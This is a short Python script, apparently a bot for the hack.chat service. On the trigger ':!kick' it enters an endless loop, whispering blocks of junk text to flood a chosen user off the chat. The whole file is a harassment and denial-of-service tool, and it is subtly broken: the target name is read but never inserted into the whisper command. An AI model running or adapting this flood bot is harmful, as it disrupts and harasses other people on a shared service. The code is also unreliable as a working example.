import hackchat
import uuid
def message_got(chat, message, sender):
    if ':!kick' == message[:5]:
        x = message[5:]
        while True:
            chat.send_message('''/w {} 
                              #AAWAAAAAAAAAAAAAA
                              # #AAWAAAAAAAAAAAAAA
                              # #AAWAAAAAAAAAAAAAA)
                              #AAWAAAAAAAAAAAAAA
                              #AAWAAAAAAAAAAAAAA
                              #AAWAAAAAAAAAAAAAA
                              #AAWAAAAAAAAAAAAAA
                              ''')
def run():
    chat = hackchat.HackChat(str(uuid.uuid4())[:4],"lounge")
    chat.on_message += [message_got]
    chat.run()